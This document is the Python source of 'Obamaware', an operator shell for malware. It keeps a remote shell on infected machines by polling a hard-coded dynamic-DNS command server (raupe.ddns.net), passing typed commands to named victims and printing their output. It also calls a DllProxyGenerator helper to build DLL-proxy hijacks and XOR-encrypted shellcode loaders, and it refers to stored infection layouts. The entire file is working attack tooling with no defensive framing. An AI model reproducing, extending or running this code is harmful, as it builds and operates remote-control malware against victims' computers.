import cmd
import os
import sys  
import requests
import threading
import time

ErrorSign = "\033[33m[!]\033[0m"
Success = "\033[32m[+]\033[0m"
Status = "\033[94m[*]\033[0m"

url = "http://raupe.ddns.net/cdr"
body = "USER ||| GET"


class Obamaware(cmd.Cmd):
    intro = '\033[32mWelcome to the Obamaware shell. \033[32mType help to list commands.\033[0m\n'
    prompt = 'Obamaware>'
    file = None
    def __init__(self):
        super().__init__()
        self.revshell = False
        self.lastout = ""
    
    def safe_print(self, text):
        sys.stdout.write("\r")                    # Return to start of line
        sys.stdout.write(" " * (len(self.prompt) + 80)) # Clear the line (arbitrary width)
        sys.stdout.write("\r")                    # Return to start again
        print(text)                               # Print the output
        sys.stdout.write(self.prompt)                  # Reprint the prompt
        sys.stdout.flush()
    
    def send_request_loop(self, name, stopped):
        while not stopped.is_set():
            if not self.revshell:
                self.stop.set()
                break
            try:
                resp = requests.post(url, data=body.replace("USER", name), timeout=3)
                if len(resp.text.split(" ||| ", 1)) >= 2 and resp.text.split(" ||| ", 1)[1] != self.lastout and "execute" not in resp.text.split(" ||| ", 1)[0]:
                    self.safe_print(resp.text.split(" ||| ", 1)[1])
                    self.lastout = resp.text.split(" ||| ", 1)[1]
            except requests.RequestException as e:
                pass
            time.sleep(3)

    def send_request(self, mode, name, cmd=None):
        if mode == "GET":
            try:
                resp = requests.post(url, data=body.replace("USER", name), timeout=3)
                self.prompt = f'Obamaware {name}>'
                if not self.revshell:
                    self.revshell = True
                    self.stop = threading.Event()
                    t = threading.Thread(target=self.send_request_loop, args=(name, self.stop))
                    t.start()
                self.lastout = resp.text
            except requests.RequestException as e:
                print(f"{ErrorSign} request failed:", e)
        elif mode == "POST" and cmd:
            try:
                resp = requests.post(url, data=body.replace("USER", name).replace("GET", "execute ||| " + cmd), timeout=10)
            except requests.RequestException as e:
                print("request failed:", e)

    # ----- basic shell commands -----
    def do_EOF(self, line):
        self.revshell = False
        if self.prompt == 'Obamaware>':
            return True
        else:
            self.prompt = 'Obamaware>'

    def do_exit(self, line):
        self.revshell = False
        if self.prompt == 'Obamaware>':
            return True
        else:
            self.prompt = 'Obamaware>'

    def do_clear(self, line):
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_proxy(self, line):
        print("")
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        os.system('python DllProxyGenerator.py ' + args)
    
    def do_shellCodeLoader(self, line):
        print("")
        line = "null null " + line
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        os.system('python DllProxyGenerator.py ' + args)
    
    def do_get(self, line):
        print("")
        if line.strip() == "layout":
            if os.path.exists("layouts.txt"):
                os.system('cat layouts.txt' if os.name != 'nt' else 'type layouts.txt')
            print(f"{Status} The infection-layouts are stored in layouts.txt\n")

    def do_cmd(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        os.system(line)

    def do_revshell(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.send_request("GET", args)

    def do_help(self, line):
        print("\033[32mCommands:\033[0m")
        print("  \033[32mproxy\033[0m - Create a dll-proxy + optional ShellcodeLoader creation\n          \033[33m<dll_path> <output_exe_path> [<shellcode_path> <xor_key>] <cpp_script_path(output)>\n")
        print("  \033[32mshellCodeLoader\033[0m - Create a shellCodeLoader with XOR encrypted payload\n                    \033[33m<shellcode_path> <xor_key> <cpp_script_path(output)>\n")
        print("  \033[32mclear\033[0m - Clear the console")
        print("  \033[32mexit\033[0m - Exit the shell")
        print("  \033[32mhelp\033[0m - Show this help message")
        print("  \033[32mscmd\033[0m <command> - Execute a cmd command")
    
    def default(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        if self.revshell:
            self.send_request("POST", self.prompt.split(" ", 1)[1].strip(">"),args)
        else:
            print(f"{ErrorSign} Unknown command: {line}. Type 'help' to list commands.")

if __name__ == '__main__':
    Obamaware().cmdloop()